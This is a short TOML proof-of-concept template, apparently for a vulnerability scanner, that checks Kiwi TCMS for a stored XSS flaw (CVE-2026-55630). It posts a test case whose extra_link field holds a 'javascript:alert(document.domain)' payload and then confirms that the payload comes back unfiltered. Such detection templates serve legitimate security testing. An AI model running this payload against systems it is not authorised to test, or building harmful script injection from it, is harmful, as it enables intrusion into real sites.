[info]
author = "ave"
description = "检测 Kiwi TCMS TestCase.extra_link 字段是否存在存储型 XSS 漏洞，通过注入 javascript: URI 验证输入是否未经过滤"
id = "POC-AVE-2026-0629"
name = "CVE-2026-55630 Kiwi TCMS extra_link Stored XSS PoC"
severity = "medium"
tags = ["ave-2026-0629"]
vuln_id = [
    "CVE-2026-55630",
    "AVE-2026-0629",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/api/v1/testcases/"
protocol = "http"

[poc.requests.body]
content = '{"summary":"AVE XSS Test","extra_link":"javascript:alert(document.domain)"}'
type = "json"

[poc.requests.headers]
Authorization = "Token {{Token}}"
Content-Type = "application/json"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    201,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["javascript:alert"]

[[poc.requests]]
method = "GET"
path = "/api/v1/testcases/{{CaseID}}/"
protocol = "http"

[poc.requests.headers]
Authorization = "Token {{Token}}"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["javascript:alert"]
